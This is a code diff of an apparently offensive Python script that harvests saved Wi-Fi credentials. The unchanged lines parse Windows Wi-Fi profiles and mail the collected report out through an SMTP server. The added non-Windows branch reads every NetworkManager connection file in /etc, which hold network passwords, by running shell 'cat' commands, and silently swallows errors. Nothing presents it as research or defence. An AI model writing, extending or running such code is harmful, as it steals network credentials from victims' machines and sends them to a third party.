@@ -62,7 +62,7 @@ if os.name == "nt":
     with open(file_path + "\\" + sys_info, "w") as f:
         f.write("All reg conns: \n")
         f.close()
-        
+
     for wordblk in output.split():
         if wordblk == "Profile":
             next_word = words_list[words_list.index(wordblk) + jungkook]
@@ -139,3 +139,23 @@ if os.name == "nt":
     with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
         server.login(YOUR_USERNAME, YOUR_PASSWORD)
         server.sendmail(sender, receiver, message)
+
+
+else:
+    # non nt os code
+    # os.system("chmod +x " + os.path.basename(__file__))
+    with open(file_path + "/" + system_information, "w") as f:
+        f.write("All of Registered Connections\n")
+        f.write("==================================\n")
+    try:
+        output = glob.glob("/etc/NetworkManager/system-connections/*")
+
+        res = [sub.replace(' ', "\ ") for sub in output]
+        for i in res:
+            output = subprocess.check_output("cat " + i, shell=True)
+            output = str(output)
+            with open(file_path + "/" + system_information, "a") as f:
+                f.write(output + "\n===========================\n")
+    except:
+        pass
+
